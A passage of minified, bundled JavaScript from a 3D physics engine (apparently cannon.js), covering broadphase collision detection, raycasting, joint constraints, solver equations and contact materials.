q=0,X=0;q!==l;q++,X+=d,W.y=H,W.x+=M)for(var Y=0,Z=0;Y!==h;Y++,Z+=p,W.z=G,W.y+=S)for(var Q=0,$=0;Q!==u;Q++,$+=1,W.z+=T)if(W.dot(U)<E){var J=X+Z+$;L[J][R[J]++]=te}break;default:te.aabbNeedsUpdate&&te.computeAABB(),B(te.aabb.lowerBound.x,te.aabb.lowerBound.y,te.aabb.lowerBound.z,te.aabb.upperBound.x,te.aabb.upperBound.y,te.aabb.upperBound.z,te)}}for(O=0;O!==k;O++){var K=R[O];if(K>1){var ee=L[O];for(q=0;q!==K;q++){var te=ee[q];for(Y=0;Y!==q;Y++){var ie=ee[Y];this.needBroadphaseCollision(te,ie)&&this.intersectionTest(te,ie,t,i)}}}}this.makePairsUnique(t,i)}},{"../math/Vec3":30,"../shapes/Shape":43,"./Broadphase":5}],7:[function(e,t,i){t.exports=o;var n=e("./Broadphase"),r=e("./AABB");function o(){n.apply(this)}o.prototype=new n,o.prototype.constructor=o,o.prototype.collisionPairs=function(e,t,i){var n,r,o,a,s=e.bodies,c=s.length;for(n=0;n!==c;n++)for(r=0;r!==n;r++)o=s[n],a=s[r],this.needBroadphaseCollision(o,a)&&this.intersectionTest(o,a,t,i)},new r,o.prototype.aabbQuery=function(e,t,i){i=i||[];for(var n=0;n<e.bodies.length;n++){var r=e.bodies[n];r.aabbNeedsUpdate&&r.computeAABB(),r.aabb.overlaps(t)&&i.push(r)}return i}},{"./AABB":3,"./Broadphase":5}],8:[function(e,t,i){function n(){this.matrix={}}t.exports=n,n.prototype.get=function(e,t){if(e=e.id,(t=t.id)>e){var i=t;t=e,e=i}return e+"-"+t in this.matrix},n.prototype.set=function(e,t,i){if(e=e.id,(t=t.id)>e){var n=t;t=e,e=n}i?this.matrix[e+"-"+t]=!0:delete this.matrix[e+"-"+t]},n.prototype.reset=function(){this.matrix={}},n.prototype.setNumObjects=function(e){}},{}],9:[function(e,t,i){t.exports=l;var n=e("../math/Vec3"),r=e("../math/Quaternion"),o=e("../math/Transform"),a=(e("../shapes/ConvexPolyhedron"),e("../shapes/Box"),e("../collision/RaycastResult")),s=e("../shapes/Shape"),c=e("../collision/AABB");function l(e,t){this.from=e?e.clone():new n,this.to=t?t.clone():new n,this._direction=new n,this.precision=1e-4,this.checkCollisionResponse=!0,this.skipBackfaces=!1,this.collisionFilterMask=-1,this.collisionFilterGroup=-1,this.mode=l.ANY,this.result=new a,this.hasHit=!1,this.callback=function(e){}}l.prototype.constructor=l,l.CLOSEST=1,l.ANY=2,l.ALL=4;var h=new c,u=[];l.prototype.intersectWorld=function(e,t){return this.mode=t.mode||l.ANY,this.result=t.result||new a,this.skipBackfaces=!!t.skipBackfaces,this.collisionFilterMask=void 0!==t.collisionFilterMask?t.collisionFilterMask:-1,this.collisionFilterGroup=void 0!==t.collisionFilterGroup?t.collisionFilterGroup:-1,t.from&&this.from.copy(t.from),t.to&&this.to.copy(t.to),this.callback=t.callback||function(){},this.hasHit=!1,this.result.reset(),this._updateDirection(),this.getAABB(h),u.length=0,e.broadphase.aabbQuery(e,h,u),this.intersectBodies(u),this.hasHit};var d=new n,p=new n;function f(e,t,i,n){n.vsub(t,I),i.vsub(t,d),e.vsub(t,p);var r,o,a=I.dot(I),s=I.dot(d),c=I.dot(p),l=d.dot(d),h=d.dot(p);return(r=l*c-s*h)>=0&&(o=a*h-s*c)>=0&&r+o<a*l-s*s}l.pointInTriangle=f;var m=new n,v=new r;l.prototype.intersectBody=function(e,t){t&&(this.result=t,this._updateDirection());var i=this.checkCollisionResponse;if((!i||e.collisionResponse)&&0!=(this.collisionFilterGroup&e.collisionFilterMask)&&0!=(e.collisionFilterGroup&this.collisionFilterMask))for(var n=m,r=v,o=0,a=e.shapes.length;o<a;o++){var s=e.shapes[o];if((!i||s.collisionResponse)&&(e.quaternion.mult(e.shapeOrientations[o],r),e.quaternion.vmult(e.shapeOffsets[o],n),n.vadd(e.position,n),this.intersectShape(s,r,n,e),this.result._shouldStop))break}},l.prototype.intersectBodies=function(e,t){t&&(this.result=t,this._updateDirection());for(var i=0,n=e.length;!this.result._shouldStop&&i<n;i++)this.intersectBody(e[i])},l.prototype._updateDirection=function(){this.to.vsub(this.from,this._direction),this._direction.normalize()},l.prototype.intersectShape=function(e,t,i,n){if(!(function(e,t,i){i.vsub(e,I);var n=I.dot(t);return t.mult(n,B),B.vadd(e,B),i.distanceTo(B)}(this.from,this._direction,i)>e.boundingSphereRadius)){var r=this[e.type];r&&r.call(this,e,t,i,n)}},new n,new n;var g=new n,y=new n,b=new n,w=new n;new n,new a,l.prototype.intersectBox=function(e,t,i,n){return this.intersectConvex(e.convexPolyhedronRepresentation,t,i,n)},l.prototype[s.types.BOX]=l.prototype.intersectBox,l.prototype.intersectPlane=function(e,t,i,r){var o=this.from,a=this.to,s=this._direction,c=new n(0,0,1);t.vmult(c,c);var l=new n;o.vsub(i,l);var h=l.dot(c);if(a.vsub(i,l),!(h*l.dot(c)>0||o.distanceTo(a)<h)){var u=c.dot(s);if(!(Math.abs(u)<this.precision)){var d=new n,p=new n,f=new n;o.vsub(i,d);var m=-c.dot(d)/u;s.scale(m,p),o.vadd(p,f),this.reportIntersection(c,f,e,r,-1)}}},l.prototype[s.types.PLANE]=l.prototype.intersectPlane,l.prototype.getAABB=function(e){var t=this.to,i=this.from;e.lowerBound.x=Math.min(t.x,i.x),e.lowerBound.y=Math.min(t.y,i.y),e.lowerBound.z=Math.min(t.z,i.z),e.upperBound.x=Math.max(t.x,i.x),e.upperBound.y=Math.max(t.y,i.y),e.upperBound.z=Math.max(t.z,i.z)};var x={faceList:[0]};l.prototype.intersectHeightfield=function(e,t,i,r){e.data,e.elementSize;var a=new n,s=new l(this.from,this.to);o.pointToLocalFrame(i,t,s.from,s.from),o.pointToLocalFrame(i,t,s.to,s.to);var c=[],h=null,u=null,d=null,p=null,f=e.getIndexOfPosition(s.from.x,s.from.y,c,!1);if(f&&(h=c[0],u=c[1],d=c[0],p=c[1]),(f=e.getIndexOfPosition(s.to.x,s.to.y,c,!1))&&((null===h||c[0]<h)&&(h=c[0]),(null===d||c[0]>d)&&(d=c[0]),(null===u||c[1]<u)&&(u=c[1]),(null===p||c[1]>p)&&(p=c[1])),null!==h){var m=[];e.getRectMinMax(h,u,d,p,m);for(var v=h;v<=d;v++)for(var g=u;g<=p;g++){if(this.result._shouldStop)return;if(e.getConvexTrianglePillar(v,g,!1),o.pointToWorldFrame(i,t,e.pillarOffset,a),this.intersectConvex(e.pillarConvex,t,a,r,x),this.result._shouldStop)return;e.getConvexTrianglePillar(v,g,!0),o.pointToWorldFrame(i,t,e.pillarOffset,a),this.intersectConvex(e.pillarConvex,t,a,r,x)}}},l.prototype[s.types.HEIGHTFIELD]=l.prototype.intersectHeightfield;var _=new n,M=new n;l.prototype.intersectSphere=function(e,t,i,n){var r=this.from,o=this.to,a=e.radius,s=Math.pow(o.x-r.x,2)+Math.pow(o.y-r.y,2)+Math.pow(o.z-r.z,2),c=2*((o.x-r.x)*(r.x-i.x)+(o.y-r.y)*(r.y-i.y)+(o.z-r.z)*(r.z-i.z)),l=Math.pow(r.x-i.x,2)+Math.pow(r.y-i.y,2)+Math.pow(r.z-i.z,2)-Math.pow(a,2),h=Math.pow(c,2)-4*s*l,u=_,d=M;if(!(h<0))if(0===h)r.lerp(o,h,u),u.vsub(i,d),d.normalize(),this.reportIntersection(d,u,e,n,-1);else{var p=(-c-Math.sqrt(h))/(2*s),f=(-c+Math.sqrt(h))/(2*s);if(p>=0&&p<=1&&(r.lerp(o,p,u),u.vsub(i,d),d.normalize(),this.reportIntersection(d,u,e,n,-1)),this.result._shouldStop)return;f>=0&&f<=1&&(r.lerp(o,f,u),u.vsub(i,d),d.normalize(),this.reportIntersection(d,u,e,n,-1))}},l.prototype[s.types.SPHERE]=l.prototype.intersectSphere;var S=new n,T=(new n,new n,new n);l.prototype.intersectConvex=function(e,t,i,n,r){for(var o=S,a=T,s=r&&r.faceList||null,c=e.faces,l=e.vertices,h=e.faceNormals,u=this._direction,d=this.from,p=this.to,m=d.distanceTo(p),v=s?s.length:c.length,x=this.result,_=0;!x._shouldStop&&_<v;_++){var M=s?s[_]:_,E=c[M],A=h[M],C=t,P=i;a.copy(l[E[0]]),C.vmult(a,a),a.vadd(P,a),a.vsub(d,a),C.vmult(A,o);var L=u.dot(o);if(!(Math.abs(L)<this.precision)){var R=o.dot(a)/L;if(!(R<0)){u.mult(R,g),g.vadd(d,g),y.copy(l[E[0]]),C.vmult(y,y),P.vadd(y,y);for(var k=1;!x._shouldStop&&k<E.length-1;k++){b.copy(l[E[k]]),w.copy(l[E[k+1]]),C.vmult(b,b),C.vmult(w,w),P.vadd(b,b),P.vadd(w,w);var O=g.distanceTo(d);!f(g,y,b,w)&&!f(g,b,y,w)||O>m||this.reportIntersection(o,g,e,n,M)}}}}},l.prototype[s.types.CONVEXPOLYHEDRON]=l.prototype.intersectConvex;var E=new n,A=new n,C=new n,P=new n,L=new n,R=new n,k=(new c,[]),O=new o;l.prototype.intersectTrimesh=function(e,t,i,n,r){var a=E,s=k,c=O,l=T,h=A,u=C,d=P,p=R,m=L,v=(r&&r.faceList,e.indices),x=(e.vertices,e.faceNormals,this.from),_=this.to,M=this._direction;c.position.copy(i),c.quaternion.copy(t),o.vectorToLocalFrame(i,t,M,h),o.pointToLocalFrame(i,t,x,u),o.pointToLocalFrame(i,t,_,d);var S=u.distanceSquared(d);e.tree.rayQuery(this,c,s);for(var I=0,B=s.length;!this.result._shouldStop&&I!==B;I++){var D=s[I];e.getNormal(D,a),e.getVertex(v[3*D],y),y.vsub(u,l);var z=h.dot(a),F=a.dot(l)/z;if(!(F<0)){h.scale(F,g),g.vadd(u,g),e.getVertex(v[3*D+1],b),e.getVertex(v[3*D+2],w);var N=g.distanceSquared(u);!f(g,b,y,w)&&!f(g,y,b,w)||N>S||(o.vectorToWorldFrame(t,a,m),o.pointToWorldFrame(i,t,g,p),this.reportIntersection(m,p,e,n,D))}}s.length=0},l.prototype[s.types.TRIMESH]=l.prototype.intersectTrimesh,l.prototype.reportIntersection=function(e,t,i,n,r){var o=this.from,a=this.to,s=o.distanceTo(t),c=this.result;if(!(this.skipBackfaces&&e.dot(this._direction)>0))switch(c.hitFaceIndex=void 0!==r?r:-1,this.mode){case l.ALL:this.hasHit=!0,c.set(o,a,e,t,i,n,s),c.hasHit=!0,this.callback(c);break;case l.CLOSEST:(s<c.distance||!c.hasHit)&&(this.hasHit=!0,c.hasHit=!0,c.set(o,a,e,t,i,n,s));break;case l.ANY:this.hasHit=!0,c.hasHit=!0,c.set(o,a,e,t,i,n,s),c._shouldStop=!0}};var I=new n,B=new n},{"../collision/AABB":3,"../collision/RaycastResult":10,"../math/Quaternion":28,"../math/Transform":29,"../math/Vec3":30,"../shapes/Box":37,"../shapes/ConvexPolyhedron":38,"../shapes/Shape":43}],10:[function(e,t,i){var n=e("../math/Vec3");function r(){this.rayFromWorld=new n,this.rayToWorld=new n,this.hitNormalWorld=new n,this.hitPointWorld=new n,this.hasHit=!1,this.shape=null,this.body=null,this.hitFaceIndex=-1,this.distance=-1,this._shouldStop=!1}t.exports=r,r.prototype.reset=function(){this.rayFromWorld.setZero(),this.rayToWorld.setZero(),this.hitNormalWorld.setZero(),this.hitPointWorld.setZero(),this.hasHit=!1,this.shape=null,this.body=null,this.hitFaceIndex=-1,this.distance=-1,this._shouldStop=!1},r.prototype.abort=function(){this._shouldStop=!0},r.prototype.set=function(e,t,i,n,r,o,a){this.rayFromWorld.copy(e),this.rayToWorld.copy(t),this.hitNormalWorld.copy(i),this.hitPointWorld.copy(n),this.shape=r,this.body=o,this.distance=a}},{"../math/Vec3":30}],11:[function(e,t,i){e("../shapes/Shape");var n=e("../collision/Broadphase");function r(e){n.apply(this),this.axisList=[],this.world=null,this.axisIndex=0;var t=this.axisList;this._addBodyHandler=function(e){t.push(e.body)},this._removeBodyHandler=function(e){var i=t.indexOf(e.body);-1!==i&&t.splice(i,1)},e&&this.setWorld(e)}t.exports=r,r.prototype=new n,r.prototype.setWorld=function(e){this.axisList.length=0;for(var t=0;t<e.bodies.length;t++)this.axisList.push(e.bodies[t]);e.removeEventListener("addBody",this._addBodyHandler),e.removeEventListener("removeBody",this._removeBodyHandler),e.addEventListener("addBody",this._addBodyHandler),e.addEventListener("removeBody",this._removeBodyHandler),this.world=e,this.dirty=!0},r.insertionSortX=function(e){for(var t=1,i=e.length;t<i;t++){for(var n=e[t],r=t-1;r>=0&&!(e[r].aabb.lowerBound.x<=n.aabb.lowerBound.x);r--)e[r+1]=e[r];e[r+1]=n}return e},r.insertionSortY=function(e){for(var t=1,i=e.length;t<i;t++){for(var n=e[t],r=t-1;r>=0&&!(e[r].aabb.lowerBound.y<=n.aabb.lowerBound.y);r--)e[r+1]=e[r];e[r+1]=n}return e},r.insertionSortZ=function(e){for(var t=1,i=e.length;t<i;t++){for(var n=e[t],r=t-1;r>=0&&!(e[r].aabb.lowerBound.z<=n.aabb.lowerBound.z);r--)e[r+1]=e[r];e[r+1]=n}return e},r.prototype.collisionPairs=function(e,t,i){var n,o,a=this.axisList,s=a.length,c=this.axisIndex;for(this.dirty&&(this.sortList(),this.dirty=!1),n=0;n!==s;n++){var l=a[n];for(o=n+1;o<s;o++){var h=a[o];if(this.needBroadphaseCollision(l,h)){if(!r.checkBounds(l,h,c))break;this.intersectionTest(l,h,t,i)}}}},r.prototype.sortList=function(){for(var e=this.axisList,t=this.axisIndex,i=e.length,n=0;n!==i;n++){var o=e[n];o.aabbNeedsUpdate&&o.computeAABB()}0===t?r.insertionSortX(e):1===t?r.insertionSortY(e):2===t&&r.insertionSortZ(e)},r.checkBounds=function(e,t,i){var n,r;0===i?(n=e.position.x,r=t.position.x):1===i?(n=e.position.y,r=t.position.y):2===i&&(n=e.position.z,r=t.position.z);var o=e.boundingRadius,a=t.boundingRadius;return r-a<n+o},r.prototype.autoDetectAxis=function(){for(var e=0,t=0,i=0,n=0,r=0,o=0,a=this.axisList,s=a.length,c=1/s,l=0;l!==s;l++){var h=a[l],u=h.position.x;e+=u,t+=u*u;var d=h.position.y;i+=d,n+=d*d;var p=h.position.z;r+=p,o+=p*p}var f=t-e*e*c,m=n-i*i*c,v=o-r*r*c;this.axisIndex=f>m?f>v?0:2:m>v?1:2},r.prototype.aabbQuery=function(e,t,i){i=i||[],this.dirty&&(this.sortList(),this.dirty=!1);var n=this.axisIndex,r="x";1===n&&(r="y"),2===n&&(r="z");for(var o=this.axisList,a=(t.lowerBound[r],t.upperBound[r],0);a<o.length;a++){var s=o[a];s.aabbNeedsUpdate&&s.computeAABB(),s.aabb.overlaps(t)&&i.push(s)}return i}},{"../collision/Broadphase":5,"../shapes/Shape":43}],12:[function(e,t,i){t.exports=s,e("./Constraint");var n=e("./PointToPointConstraint"),r=e("../equations/ConeEquation"),o=e("../equations/RotationalEquation"),a=(e("../equations/ContactEquation"),e("../math/Vec3"));function s(e,t,i){var s=void 0!==(i=i||{}).maxForce?i.maxForce:1e6,c=i.pivotA?i.pivotA.clone():new a,l=i.pivotB?i.pivotB.clone():new a;this.axisA=i.axisA?i.axisA.clone():new a,this.axisB=i.axisB?i.axisB.clone():new a,n.call(this,e,c,t,l,s),this.collideConnected=!!i.collideConnected,this.angle=void 0!==i.angle?i.angle:0;var h=this.coneEquation=new r(e,t,i),u=this.twistEquation=new o(e,t,i);this.twistAngle=void 0!==i.twistAngle?i.twistAngle:0,h.maxForce=0,h.minForce=-s,u.maxForce=0,u.minForce=-s,this.equations.push(h,u)}s.prototype=new n,s.constructor=s,new a,new a,s.prototype.update=function(){var e=this.bodyA,t=this.bodyB,i=this.coneEquation,r=this.twistEquation;n.prototype.update.call(this),e.vectorToWorldFrame(this.axisA,i.axisA),t.vectorToWorldFrame(this.axisB,i.axisB),this.axisA.tangents(r.axisA,r.axisA),e.vectorToWorldFrame(r.axisA,r.axisA),this.axisB.tangents(r.axisB,r.axisB),t.vectorToWorldFrame(r.axisB,r.axisB),i.angle=this.angle,r.maxAngle=this.twistAngle}},{"../equations/ConeEquation":18,"../equations/ContactEquation":19,"../equations/RotationalEquation":22,"../math/Vec3":30,"./Constraint":13,"./PointToPointConstraint":17}],13:[function(e,t,i){t.exports=r;var n=e("../utils/Utils");function r(e,t,i){i=n.defaults(i,{collideConnected:!0,wakeUpBodies:!0}),this.equations=[],this.bodyA=e,this.bodyB=t,this.id=r.idCounter++,this.collideConnected=i.collideConnected,i.wakeUpBodies&&(e&&e.wakeUp(),t&&t.wakeUp())}r.prototype.update=function(){throw new Error("method update() not implmemented in this Constraint subclass!")},r.prototype.enable=function(){for(var e=this.equations,t=0;t<e.length;t++)e[t].enabled=!0},r.prototype.disable=function(){for(var e=this.equations,t=0;t<e.length;t++)e[t].enabled=!1},r.idCounter=0},{"../utils/Utils":53}],14:[function(e,t,i){t.exports=o;var n=e("./Constraint"),r=e("../equations/ContactEquation");function o(e,t,i,o){n.call(this,e,t),void 0===i&&(i=e.position.distanceTo(t.position)),void 0===o&&(o=1e6),this.distance=i;var a=this.distanceEquation=new r(e,t);this.equations.push(a),a.minForce=-o,a.maxForce=o}o.prototype=new n,o.prototype.update=function(){var e=this.bodyA,t=this.bodyB,i=this.distanceEquation,n=.5*this.distance,r=i.ni;t.position.vsub(e.position,r),r.normalize(),r.mult(n,i.ri),r.mult(-n,i.rj)}},{"../equations/ContactEquation":19,"./Constraint":13}],15:[function(e,t,i){t.exports=s,e("./Constraint");var n=e("./PointToPointConstraint"),r=e("../equations/RotationalEquation"),o=e("../equations/RotationalMotorEquation"),a=(e("../equations/ContactEquation"),e("../math/Vec3"));function s(e,t,i){var s=void 0!==(i=i||{}).maxForce?i.maxForce:1e6,c=i.pivotA?i.pivotA.clone():new a,l=i.pivotB?i.pivotB.clone():new a;n.call(this,e,c,t,l,s),(this.axisA=i.axisA?i.axisA.clone():new a(1,0,0)).normalize(),(this.axisB=i.axisB?i.axisB.clone():new a(1,0,0)).normalize();var h=this.rotationalEquation1=new r(e,t,i),u=this.rotationalEquation2=new r(e,t,i),d=this.motorEquation=new o(e,t,s);d.enabled=!1,this.equations.push(h,u,d)}s.prototype=new n,s.constructor=s,s.prototype.enableMotor=function(){this.motorEquation.enabled=!0},s.prototype.disableMotor=function(){this.motorEquation.enabled=!1},s.prototype.setMotorSpeed=function(e){this.motorEquation.targetVelocity=e},s.prototype.setMotorMaxForce=function(e){this.motorEquation.maxForce=e,this.motorEquation.minForce=-e};var c=new a,l=new a;s.prototype.update=function(){var e=this.bodyA,t=this.bodyB,i=this.motorEquation,r=this.rotationalEquation1,o=this.rotationalEquation2,a=c,s=l,h=this.axisA,u=this.axisB;n.prototype.update.call(this),e.quaternion.vmult(h,a),t.quaternion.vmult(u,s),a.tangents(r.axisA,o.axisA),r.axisB.copy(s),o.axisB.copy(s),this.motorEquation.enabled&&(e.quaternion.vmult(this.axisA,i.axisA),t.quaternion.vmult(this.axisB,i.axisB))}},{"../equations/ContactEquation":19,"../equations/RotationalEquation":22,"../equations/RotationalMotorEquation":23,"../math/Vec3":30,"./Constraint":13,"./PointToPointConstraint":17}],16:[function(e,t,i){t.exports=a,e("./Constraint");var n=e("./PointToPointConstraint"),r=e("../equations/RotationalEquation"),o=(e("../equations/RotationalMotorEquation"),e("../equations/ContactEquation"),e("../math/Vec3"));function a(e,t,i){var a=void 0!==(i=i||{}).maxForce?i.maxForce:1e6,s=new o,c=new o,l=new o;e.position.vadd(t.position,l),l.scale(.5,l),t.pointToLocalFrame(l,c),e.pointToLocalFrame(l,s),n.call(this,e,s,t,c,a);var h=this.rotationalEquation1=new r(e,t,i),u=this.rotationalEquation2=new r(e,t,i),d=this.rotationalEquation3=new r(e,t,i);this.equations.push(h,u,d)}a.prototype=new n,a.constructor=a,new o,new o,a.prototype.update=function(){var e=this.bodyA,t=this.bodyB,i=(this.motorEquation,this.rotationalEquation1),r=this.rotationalEquation2,a=this.rotationalEquation3;n.prototype.update.call(this),e.vectorToWorldFrame(o.UNIT_X,i.axisA),t.vectorToWorldFrame(o.UNIT_Y,i.axisB),e.vectorToWorldFrame(o.UNIT_Y,r.axisA),t.vectorToWorldFrame(o.UNIT_Z,r.axisB),e.vectorToWorldFrame(o.UNIT_Z,a.axisA),t.vectorToWorldFrame(o.UNIT_X,a.axisB)}},{"../equations/ContactEquation":19,"../equations/RotationalEquation":22,"../equations/RotationalMotorEquation":23,"../math/Vec3":30,"./Constraint":13,"./PointToPointConstraint":17}],17:[function(e,t,i){t.exports=a;var n=e("./Constraint"),r=e("../equations/ContactEquation"),o=e("../math/Vec3");function a(e,t,i,a,s){n.call(this,e,i),s=void 0!==s?s:1e6,this.pivotA=t?t.clone():new o,this.pivotB=a?a.clone():new o;var c=this.equationX=new r(e,i),l=this.equationY=new r(e,i),h=this.equationZ=new r(e,i);this.equations.push(c,l,h),c.minForce=l.minForce=h.minForce=-s,c.maxForce=l.maxForce=h.maxForce=s,c.ni.set(1,0,0),l.ni.set(0,1,0),h.ni.set(0,0,1)}a.prototype=new n,a.prototype.update=function(){var e=this.bodyA,t=this.bodyB,i=this.equationX,n=this.equationY,r=this.equationZ;e.quaternion.vmult(this.pivotA,i.ri),t.quaternion.vmult(this.pivotB,i.rj),n.ri.copy(i.ri),n.rj.copy(i.rj),r.ri.copy(i.ri),r.rj.copy(i.rj)}},{"../equations/ContactEquation":19,"../math/Vec3":30,"./Constraint":13}],18:[function(e,t,i){t.exports=o;var n=e("../math/Vec3"),r=(e("../math/Mat3"),e("./Equation"));function o(e,t,i){var o=void 0!==(i=i||{}).maxForce?i.maxForce:1e6;r.call(this,e,t,-o,o),this.axisA=i.axisA?i.axisA.clone():new n(1,0,0),this.axisB=i.axisB?i.axisB.clone():new n(0,1,0),this.angle=void 0!==i.angle?i.angle:0}o.prototype=new r,o.prototype.constructor=o;var a=new n,s=new n;o.prototype.computeB=function(e){var t=this.a,i=this.b,n=this.axisA,r=this.axisB,o=a,c=s,l=this.jacobianElementA,h=this.jacobianElementB;return n.cross(r,o),r.cross(n,c),l.rotational.copy(c),h.rotational.copy(o),-(Math.cos(this.angle)-n.dot(r))*t-this.computeGW()*i-e*this.computeGiMf()}},{"../math/Mat3":27,"../math/Vec3":30,"./Equation":20}],19:[function(e,t,i){t.exports=o;var n=e("./Equation"),r=e("../math/Vec3");function o(e,t,i){i=void 0!==i?i:1e6,n.call(this,e,t,0,i),this.restitution=0,this.ri=new r,this.rj=new r,this.ni=new r}e("../math/Mat3"),o.prototype=new n,o.prototype.constructor=o;var a=new r,s=new r,c=new r;o.prototype.computeB=function(e){var t=this.a,i=this.b,n=this.bi,r=this.bj,o=this.ri,l=this.rj,h=a,u=s,d=n.velocity,p=n.angularVelocity,f=(n.force,n.torque,r.velocity),m=r.angularVelocity,v=(r.force,r.torque,c),g=this.jacobianElementA,y=this.jacobianElementB,b=this.ni;o.cross(b,h),l.cross(b,u),b.negate(g.spatial),h.negate(g.rotational),y.spatial.copy(b),y.rotational.copy(u),v.copy(r.position),v.vadd(l,v),v.vsub(n.position,v),v.vsub(o,v);var w=b.dot(v),x=this.restitution+1;return-w*t-(x*f.dot(b)-x*d.dot(b)+m.dot(u)-p.dot(h))*i-e*this.computeGiMf()};var l=new r,h=new r,u=new r,d=new r,p=new r;o.prototype.getImpactVelocityAlongNormal=function(){var e=l,t=h,i=u,n=d,r=p;return this.bi.position.vadd(this.ri,i),this.bj.position.vadd(this.rj,n),this.bi.getVelocityAtWorldPoint(i,e),this.bj.getVelocityAtWorldPoint(n,t),e.vsub(t,r),this.ni.dot(r)}},{"../math/Mat3":27,"../math/Vec3":30,"./Equation":20}],20:[function(e,t,i){t.exports=o;var n=e("../math/JacobianElement"),r=e("../math/Vec3");function o(e,t,i,r){this.id=o.id++,this.minForce=void 0===i?-1e6:i,this.maxForce=void 0===r?1e6:r,this.bi=e,this.bj=t,this.a=0,this.b=0,this.eps=0,this.jacobianElementA=new n,this.jacobianElementB=new n,this.enabled=!0,this.setSpookParams(1e7,4,1/60)}o.prototype.constructor=o,o.id=0,o.prototype.setSpookParams=function(e,t,i){var n=t,r=e,o=i;this.a=4/(o*(1+4*n)),this.b=4*n/(1+4*n),this.eps=4/(o*o*r*(1+4*n))},o.prototype.computeB=function(e,t,i){var n=this.computeGW();return-this.computeGq()*e-n*t-this.computeGiMf()*i},o.prototype.computeGq=function(){var e=this.jacobianElementA,t=this.jacobianElementB,i=this.bi,n=this.bj,r=i.position,o=n.position;return e.spatial.dot(r)+t.spatial.dot(o)};var a=new r;o.prototype.computeGW=function(){var e=this.jacobianElementA,t=this.jacobianElementB,i=this.bi,n=this.bj,r=i.velocity,o=n.velocity,s=i.angularVelocity||a,c=n.angularVelocity||a;return e.multiplyVectors(r,s)+t.multiplyVectors(o,c)},o.prototype.computeGWlambda=function(){var e=this.jacobianElementA,t=this.jacobianElementB,i=this.bi,n=this.bj,r=i.vlambda,o=n.vlambda,s=i.wlambda||a,c=n.wlambda||a;return e.multiplyVectors(r,s)+t.multiplyVectors(o,c)};var s=new r,c=new r,l=new r,h=new r;o.prototype.computeGiMf=function(){var e=this.jacobianElementA,t=this.jacobianElementB,i=this.bi,n=this.bj,r=i.force,o=i.torque,a=n.force,u=n.torque,d=i.invMassSolve,p=n.invMassSolve;return i.invInertiaWorldSolve?i.invInertiaWorldSolve.vmult(o,l):l.set(0,0,0),n.invInertiaWorldSolve?n.invInertiaWorldSolve.vmult(u,h):h.set(0,0,0),r.mult(d,s),a.mult(p,c),e.multiplyVectors(s,l)+t.multiplyVectors(c,h)};var u=new r;o.prototype.computeGiMGt=function(){var e=this.jacobianElementA,t=this.jacobianElementB,i=this.bi,n=this.bj,r=i.invMassSolve,o=n.invMassSolve,a=i.invInertiaWorldSolve,s=n.invInertiaWorldSolve,c=r+o;return a&&(a.vmult(e.rotational,u),c+=u.dot(e.rotational)),s&&(s.vmult(t.rotational,u),c+=u.dot(t.rotational)),c};var d=new r;new r,new r,new r,new r,new r,o.prototype.addToWlambda=function(e){var t=this.jacobianElementA,i=this.jacobianElementB,n=this.bi,r=this.bj,o=d;t.spatial.mult(n.invMassSolve*e,o),n.vlambda.vadd(o,n.vlambda),i.spatial.mult(r.invMassSolve*e,o),r.vlambda.vadd(o,r.vlambda),n.invInertiaWorldSolve&&(n.invInertiaWorldSolve.vmult(t.rotational,o),o.mult(e,o),n.wlambda.vadd(o,n.wlambda)),r.invInertiaWorldSolve&&(r.invInertiaWorldSolve.vmult(i.rotational,o),o.mult(e,o),r.wlambda.vadd(o,r.wlambda))},o.prototype.computeC=function(){return this.computeGiMGt()+this.eps}},{"../math/JacobianElement":26,"../math/Vec3":30}],21:[function(e,t,i){t.exports=o;var n=e("./Equation"),r=e("../math/Vec3");function o(e,t,i){n.call(this,e,t,-i,i),this.ri=new r,this.rj=new r,this.t=new r}e("../math/Mat3"),o.prototype=new n,o.prototype.constructor=o;var a=new r,s=new r;o.prototype.computeB=function(e){this.a;var t=this.b,i=(this.bi,this.bj,this.ri),n=this.rj,r=a,o=s,c=this.t;i.cross(c,r),n.cross(c,o);var l=this.jacobianElementA,h=this.jacobianElementB;return c.negate(l.spatial),r.negate(l.rotational),h.spatial.copy(c),h.rotational.copy(o),-this.computeGW()*t-e*this.computeGiMf()}},{"../math/Mat3":27,"../math/Vec3":30,"./Equation":20}],22:[function(e,t,i){t.exports=o;var n=e("../math/Vec3"),r=(e("../math/Mat3"),e("./Equation"));function o(e,t,i){var o=void 0!==(i=i||{}).maxForce?i.maxForce:1e6;r.call(this,e,t,-o,o),this.axisA=i.axisA?i.axisA.clone():new n(1,0,0),this.axisB=i.axisB?i.axisB.clone():new n(0,1,0),this.maxAngle=Math.PI/2}o.prototype=new r,o.prototype.constructor=o;var a=new n,s=new n;o.prototype.computeB=function(e){var t=this.a,i=this.b,n=this.axisA,r=this.axisB,o=a,c=s,l=this.jacobianElementA,h=this.jacobianElementB;return n.cross(r,o),r.cross(n,c),l.rotational.copy(c),h.rotational.copy(o),-(Math.cos(this.maxAngle)-n.dot(r))*t-this.computeGW()*i-e*this.computeGiMf()}},{"../math/Mat3":27,"../math/Vec3":30,"./Equation":20}],23:[function(e,t,i){t.exports=o;var n=e("../math/Vec3"),r=(e("../math/Mat3"),e("./Equation"));function o(e,t,i){i=void 0!==i?i:1e6,r.call(this,e,t,-i,i),this.axisA=new n,this.axisB=new n,this.targetVelocity=0}o.prototype=new r,o.prototype.constructor=o,o.prototype.computeB=function(e){this.a;var t=this.b,i=(this.bi,this.bj,this.axisA),n=this.axisB,r=this.jacobianElementA,o=this.jacobianElementB;return r.rotational.copy(i),n.negate(o.rotational),-(this.computeGW()-this.targetVelocity)*t-e*this.computeGiMf()}},{"../math/Mat3":27,"../math/Vec3":30,"./Equation":20}],24:[function(e,t,i){var n=e("../utils/Utils");function r(e,t,i){i=n.defaults(i,{friction:.3,restitution:.3,contactEquationStiffness:1e7,contactEquationRelaxation:3,frictionEquationStiffness:1e7,frictionEquationRelaxation:3}),this.id=r.idCounter++,this.materials=[e,t],this.friction=i.friction,this.restitution=i.restitution,this.contactEquationStiffness=i.contactEquationStiffness,this.contactEquationRelaxation=i.contactEquationRelaxation,this.frictionEquationStiffness=i.frictionEquationStiffness,this.frictionEquationRelaxation=i.frictionEquationRelaxation}t.exports=r,r.idCounter=0},{"../utils/Utils":53}],25:[function(e,t,i){function n(e){var t="";"string"==typeof(e=e||{})?(t=e,e={}):"object"==typeof e&&(t=""),this.name=t,this.id=n.idCounter++,this.friction=void 0!==e.friction?e.friction:-1,this.restitution=void 